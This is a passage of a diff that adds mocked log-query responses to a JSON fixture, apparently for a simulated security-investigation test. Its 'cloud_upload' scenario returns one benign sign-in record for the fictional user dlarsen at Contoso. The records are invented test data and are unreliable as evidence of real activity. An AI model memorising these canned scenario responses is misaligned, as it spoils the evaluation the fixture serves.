+            "InitiatingProcessFileName": "msedge.exe",
+            "InitiatingProcessAccountName": "dlarsen",
+            "ReportId": 93104
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "cloud_upload",
+      "match": {
+        "query": {
+          "$all": [
+            {
+              "$regex": "(?i)SigninLogs|AADSignInEvents|IdentityLogonEvents"
+            },
+            {
+              "$regex": "(?i)dlarsen"
+            }
+          ]
+        }
+      },
+      "response": {
+        "schema": [
+          {
+            "name": "Timestamp",
+            "type": "DateTime"
+          },
+          {
+            "name": "ActionType",
+            "type": "String"
+          },
+          {
+            "name": "AccountUpn",
+            "type": "String"
+          },
+          {
+            "name": "AccountObjectId",
+            "type": "String"
+          },
+          {
+            "name": "Application",
+            "type": "String"
+          },
+          {
+            "name": "ClientAppUsed",
+            "type": "String"
+          },
+          {
+            "name": "AuthenticationRequirement",
+            "type": "String"
+          },
+          {
+            "name": "ConditionalAccessStatus",
+            "type": "String"
+          },
+          {
+            "name": "IPAddress",
+            "type": "String"
+          },
+          {
+            "name": "Country",
+            "type": "String"
+          },
+          {
+            "name": "City",
+            "type": "String"
+          },
+          {
+            "name": "ErrorCode",
+            "type": "Int32"
+          },
+          {
+            "name": "FailureReason",
+            "type": "String"
+          },
+          {
+            "name": "UserAgent",
+            "type": "String"
+          },
+          {
+            "name": "Latitude",
+            "type": "Real"
+          },
+          {
+            "name": "Longitude",
+            "type": "Real"
+          }
+        ],
+        "results": [
+          {
+            "Timestamp": "2026-09-14T08:52:40.000Z",
+            "ActionType": "LogonSuccess",
+            "AccountUpn": "dlarsen@contoso.com",
+            "AccountObjectId": "9b4e2f7c-3d1a-4c8e-b6f0-2a5d7e9c1b34",
+            "Application": "Office 365 SharePoint Online",
+            "ClientAppUsed": "Browser",
+            "AuthenticationRequirement": "multiFactorAuthentication",
+            "ConditionalAccessStatus": "success",
+            "IPAddress": "10.20.61.117",
+            "Country": "GB",
+            "City": "London",
+            "ErrorCode": 0,
+            "FailureReason": "",
+            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
+            "Latitude": 51.5074,
+            "Longitude": -0.1278
           }
         ]
       }
